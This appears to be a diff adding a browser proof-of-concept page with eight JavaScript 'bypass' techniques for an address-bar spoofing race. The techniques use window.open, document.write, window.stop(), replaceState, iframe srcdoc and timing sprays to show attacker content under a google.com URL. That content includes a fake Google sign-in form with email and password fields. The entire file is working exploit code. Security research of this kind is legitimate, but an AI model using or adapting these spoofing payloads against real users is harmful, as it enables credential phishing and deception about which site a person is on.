@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Race Condition Bypass Tests</title>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; padding: 20px; background: #111; color: #eee; }
+        button { display: block; width: 100%; padding: 14px; margin: 8px 0; background: #7f5af0; color: #fff; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; }
+        .section { background: #1a1a2e; padding: 16px; border-radius: 10px; margin: 16px 0; }
+        .section h3 { color: #7f5af0; margin: 0 0 8px 0; font-size: 15px; }
+        .desc { color: #888; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<h2>Race Condition Address Bar Spoof</h2>
+
+<!-- Bypass 1: document.write + window.stop() -->
+<div class="section">
+    <h3>Bypass 1: document.write + window.stop()</h3>
+    <p class="desc">Write content then immediately stop() navigation.
+    Address bar may already show google.com but stop() prevents the real page from loading.</p>
+    <button onclick="bypass1()">Test Bypass 1</button>
+</div>
+
+<!-- Bypass 2: Multiple timing attempts -->
+<div class="section">
+    <h3>Bypass 2: Spray timing (10ms - 500ms)</h3>
+    <p class="desc">Try document.write at many different timings.
+    One of them might hit the sweet spot where URL bar updated but document is still writable.</p>
+    <button onclick="bypass2()">Test Bypass 2</button>
+</div>
+
+<!-- Bypass 3: Slow target + fast write -->
+<div class="section">
+    <h3>Bypass 3: Slow target URL</h3>
+    <p class="desc">Use a Google URL that loads slowly (large search results page).
+    More time between URL bar update and page commit = bigger race window.</p>
+    <button onclick="bypass3()">Test Bypass 3</button>
+</div>
+
+<!-- Bypass 4: about:blank then pushState -->
+<div class="section">
+    <h3>Bypass 4: about:blank + document.write + replaceState</h3>
+    <p class="desc">Open about:blank, write attacker content, then try history.replaceState
+    to change the displayed URL to google.com.</p>
+    <button onclick="bypass4()">Test Bypass 4</button>
+</div>
+
+<!-- Bypass 5: Open then location.replace race -->
+<div class="section">
+    <h3>Bypass 5: document.write BEFORE setting location</h3>
+    <p class="desc">Open about:blank, write content immediately, THEN set location to google.com.
+    The content is already written, navigation starts but may not replace it if we stop() quickly.</p>
+    <button onclick="bypass5()">Test Bypass 5</button>
+</div>
+
+<!-- Bypass 6: Iframe srcdoc inside opened window -->
+<div class="section">
+    <h3>Bypass 6: Write iframe with srcdoc into window</h3>
+    <p class="desc">Instead of writing HTML directly, write an iframe with srcdoc that covers
+    the full viewport. Even if the parent navigates, the iframe might persist briefly.</p>
+    <button onclick="bypass6()">Test Bypass 6</button>
+</div>
+
+<!-- Bypass 7: window.open + rapid document.open/write loop -->
+<div class="section">
+    <h3>Bypass 7: Aggressive write loop</h3>
+    <p class="desc">Run document.write in a tight setInterval loop.
+    Keep overwriting until the browser locks us out.</p>
+    <button onclick="bypass7()">Test Bypass 7</button>
+</div>
+
+<!-- Bypass 8: Use fragment to delay navigation -->
+<div class="section">
+    <h3>Bypass 8: Navigate to google.com# then write</h3>
+    <p class="desc">Adding a fragment (#) might affect navigation timing.
+    The browser may handle the URL bar update differently with fragments.</p>
+    <button onclick="bypass8()">Test Bypass 8</button>
+</div>
+
+<script>
+const TARGET = "https://www.google.com/";
+const FAKE_CONTENT = `
+<html>
+<head><title>Google</title></head>
+<body style="font-family:arial;padding:40px;background:#fff;">
+<h1 style="color:red;">This is NOT Google!</h1>
+<p style="font-size:18px;">The address bar shows google.com but this content is from the attacker.</p>
+<div style="margin-top:30px;padding:20px;background:#f5f5f5;border-radius:8px;max-width:400px;">
+  <p style="font-weight:bold;margin-bottom:12px;">Sign in to your Google Account</p>
+  <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:4px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;">
+  <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:4px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;">
+  <button style="width:100%;padding:10px;margin-top:8px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;">Sign In</button>
+</div>
+</body></html>`;
+
+// Bypass 1: write + stop
+function bypass1() {
+    let win = window.open(TARGET, "_blank");
+    setTimeout(() => {
+        try {
+            win.document.open();
+            win.document.write(FAKE_CONTENT);
+            win.document.close();
+            win.stop(); // Cancel pending navigation to google.com
+        } catch(e) { console.warn("Bypass 1:", e); }
+    }, 50);
+}
+
+// Bypass 2: Spray multiple timings
+function bypass2() {
+    let win = window.open(TARGET, "_blank");
+    let timings = [1, 5, 10, 20, 30, 50, 75, 100, 150, 200, 300, 500];
+    let success = false;
+
+    timings.forEach(t => {
+        setTimeout(() => {
+            if (success) return;
+            try {
+                win.document.open();
+                win.document.write(FAKE_CONTENT);
+                win.document.close();
+                win.stop();
+                success = true;
+                console.log("Bypass 2: Write succeeded at " + t + "ms");
+            } catch(e) {
+                console.log("Bypass 2: Failed at " + t + "ms");
+            }
+        }, t);
+    });
+}
+
+// Bypass 3: Slow-loading Google URL
+function bypass3() {
+    // Google Images search loads slower, more time to race
+    let slowUrl = "https://www.google.com/search?q=test&tbm=isch&tbs=isz:l";
+    let win = window.open(slowUrl, "_blank");
+
+    setTimeout(() => {
+        try {
+            win.document.open();
+            win.document.write(FAKE_CONTENT);
+            win.document.close();
+            win.stop();
+        } catch(e) { console.warn("Bypass 3:", e); }
+    }, 80);
+}
+
+// Bypass 4: about:blank + replaceState
+function bypass4() {
+    let win = window.open("about:blank", "_blank");
+
+    setTimeout(() => {
+        try {
+            win.document.open();
+            win.document.write(FAKE_CONTENT);
+            win.document.close();
+
+            // Try to change the URL bar via replaceState
+            try {
+                win.history.replaceState({}, "Google", TARGET);
+                console.log("Bypass 4: replaceState succeeded!");
+            } catch(e) {
+                // Can't replaceState to cross-origin URL, try relative
+                try {
+                    win.history.replaceState({}, "Google", "/");
+                    console.log("Bypass 4: replaceState to / succeeded");
+                } catch(e2) {
+                    console.log("Bypass 4: replaceState failed", e2);
+                }
+            }
+        } catch(e) { console.warn("Bypass 4:", e); }
+    }, 50);
+}
+
+// Bypass 5: Write first, navigate after
+function bypass5() {
+    let win = window.open("about:blank", "_blank");
+
+    // Immediately write content
+    setTimeout(() => {
+        try {
+            win.document.open();
+            win.document.write(FAKE_CONTENT);
+            win.document.close();
+            console.log("Bypass 5: Content written");
+
+            // Now navigate - bar should update but content may persist
+            win.location.href = TARGET;
+
+            // Quickly stop the navigation before page loads
+            setTimeout(() => {
+                try {
+                    win.stop();
+                    console.log("Bypass 5: stop() called");
+                } catch(e) {}
+            }, 10);
+
+            setTimeout(() => { try { win.stop(); } catch(e) {} }, 30);
+            setTimeout(() => { try { win.stop(); } catch(e) {} }, 50);
+            setTimeout(() => { try { win.stop(); } catch(e) {} }, 100);
+        } catch(e) { console.warn("Bypass 5:", e); }
+    }, 50);
+}
+
+// Bypass 6: Write fullscreen iframe
+function bypass6() {
+    let win = window.open(TARGET, "_blank");
+
+    setTimeout(() => {
+        try {
+            win.document.open();
+            win.document.write(`
+                <html><body style="margin:0;padding:0;">
+                <iframe srcdoc='${FAKE_CONTENT.replace(/'/g, "&#39;")}'
+                    style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;">
+                </iframe>
+                </body></html>
+            `);
+            win.document.close();
+            win.stop();
+        } catch(e) { console.warn("Bypass 6:", e); }
+    }, 50);
+}
+
+// Bypass 7: Aggressive write loop
+function bypass7() {
+    let win = window.open(TARGET, "_blank");
+    let written = false;
+
+    let interval = setInterval(() => {
+        try {
+            if (!written) {
+                win.document.open();
+                win.document.write(FAKE_CONTENT);
+                win.document.close();
+                win.stop();
+                written = true;
+                clearInterval(interval);
+                console.log("Bypass 7: Write succeeded");
+            }
+        } catch(e) {
+            // Keep trying until blocked
+        }
+    }, 1); // Every 1ms
+
+    // Safety: stop after 1 second
+    setTimeout(() => clearInterval(interval), 1000);
+}
+
+// Bypass 8: Fragment navigation
+function bypass8() {
+    // Fragment might affect timing of URL bar update
+    let win = window.open(TARGET + "#spoofed", "_blank");
+
+    setTimeout(() => {
+        try {
+            win.document.open();
+            win.document.write(FAKE_CONTENT);
+            win.document.close();
+            win.stop();
+        } catch(e) { console.warn("Bypass 8:", e); }
+    }, 50);
+}
+</script>
+
+</body>
+</html>
